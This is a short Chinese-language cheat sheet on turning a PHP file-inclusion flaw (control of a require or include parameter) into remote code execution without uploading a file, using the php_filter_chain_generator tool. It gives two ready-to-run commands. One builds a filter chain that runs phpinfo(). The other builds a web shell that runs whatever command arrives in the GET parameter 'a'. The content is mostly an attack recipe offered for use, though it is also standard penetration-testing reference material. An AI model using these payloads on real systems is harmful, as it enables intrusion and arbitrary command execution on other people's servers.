## 描述

当完全控制require或include参数，即可通过php过滤链生成器，实现无需上传文件获取RCE





## github项目地址

[Synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)





## 用法

```
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
```

执行的内容为phpinfo()



```
python3 php_filter_chain_generator.py --chain '<?php system($_GET['a']); ?>'
```

system执行GET提交的参数a